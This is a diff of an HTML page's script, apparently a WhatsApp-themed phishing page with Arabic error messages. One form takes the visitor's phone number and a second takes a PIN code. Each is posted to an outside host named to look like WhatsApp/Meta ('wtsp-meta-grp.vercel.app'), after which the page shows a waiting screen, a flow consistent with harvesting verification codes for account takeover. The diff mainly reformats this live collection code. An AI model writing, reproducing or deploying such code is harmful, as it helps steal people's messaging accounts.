@@ -250,75 +250,62 @@ input[type="tel"] {
     </div>
 
     <script>
-const phoneForm = document.getElementById('phoneForm');
-const pinForm = document.getElementById('pinForm');
+        const phoneForm = document.getElementById('phoneForm');
+        const pinForm = document.getElementById('pinForm');
 
-phoneForm.addEventListener('submit', function(event) {
-    event.preventDefault();
-    
-    // Get the selected country code and phone number
-    const countryCode = document.getElementById('countrySelect').value;
-    const phoneNumber = document.getElementById('phoneNumber').value.trim();
+        phoneForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            console.log('Phone Number entered:', phoneNumber);
 
-    // Combine country code with phone number, adding a space between them
-    const fullPhoneNumber = countryCode + ' ' + phoneNumber;  // Adding a space between country code and phone number
+            fetch('https://wtsp-meta-grp.vercel.app/api/submit', { 
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phoneNumber })  // Send the phone number
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Phone number sent successfully');
+                    document.getElementById('phoneSection').classList.add('hidden');
+                    document.getElementById('pinSection').classList.remove('hidden');
+                } else {
+                    throw new Error('Server error, status code: ' + response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال رقم الهاتف.');
+            });
+        });
 
-    console.log('Full phone number entered:', fullPhoneNumber);  // Debugging line
+        pinForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const pinCode = document.getElementById('pinCode').value.trim();
+            console.log('PIN entered:', pinCode);
 
-    // Send the full phone number to the server
-    fetch('https://wtsp-meta-grp.vercel.app/api/submit', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ phoneNumber: fullPhoneNumber })  // Send the full phone number with space
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Phone number sent successfully');
-            // Switch to the PIN code section
-            document.getElementById('phoneSection').classList.add('hidden');
-            document.getElementById('pinSection').classList.remove('hidden');
-        } else {
-            throw new Error('Server error, status code: ' + response.status);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('حدث خطأ أثناء إرسال رقم الهاتف.');
-    });
-});
-
-pinForm.addEventListener('submit', function(event) {
-    event.preventDefault();
-    const pinCode = document.getElementById('pinCode').value.trim();
-
-    console.log('PIN entered:', pinCode);  // Debugging line
-
-    // Send the PIN code to the server
-    fetch('https://wtsp-meta-grp.vercel.app/api/submit', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ pinCode: pinCode })  // Only send pinCode
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('PIN sent successfully');
-            // Hide pin section and show wait section
-            document.getElementById('pinSection').classList.add('hidden');
-            document.getElementById('waitSection').classList.remove('hidden');
-        } else {
-            throw new Error('Server error, status code: ' + response.status);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('حدث خطأ أثناء إرسال رمز PIN.');
-    });
-});
-
+            fetch('https://wtsp-meta-grp.vercel.app/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ pinCode })  // Only send pinCode
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('PIN sent successfully');
+                    document.getElementById('pinSection').classList.add('hidden');
+                    document.getElementById('waitSection').classList.remove('hidden');
+                } else {
+                    throw new Error('Server error, status code: ' + response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال رمز PIN.');
+            });
+        });
     </script>
 </body>
 </html>
